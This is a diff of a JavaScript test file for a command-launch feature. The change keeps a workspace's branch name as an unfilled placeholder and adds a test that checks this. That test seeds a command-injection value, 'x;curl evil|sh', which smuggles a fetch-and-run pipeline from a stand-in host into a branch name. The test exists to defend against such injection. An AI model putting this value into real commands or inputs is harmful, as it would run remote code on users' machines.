@@ -739,7 +739,7 @@ describe('launchAction', () => {
     });
   });
 
-  it("gives a new workspace's command its tokens, leaving input it never asked for", () => {
+  it("gives a new workspace's command its target branch, leaving input it never asked for", () => {
     const created = seed({ branchName: 'feature/login' });
 
     expect(
@@ -747,7 +747,15 @@ describe('launchAction', () => {
         { ...runTests, content: 'git log {{target_branch}}..{{branchName}} {{user_input}}' },
         created
       )
-    ).toBe('git log develop..feature/login {{user_input}}');
+    ).toBe('git log develop..{{branchName}} {{user_input}}');
+  });
+
+  it("leaves the workspace's values for the terminal to quote when a command runs", async () => {
+    seed({ branchName: 'x;curl evil|sh' });
+
+    await launch({ ...runTests, content: 'git push origin {{branchName}}' }, { kind: 'tab' });
+
+    expect(api.addTerminal.mock.calls[0][2]).toBe('git push origin {{branchName}}');
   });
 
   it('says so when the launch fails before anything starts', async () => {
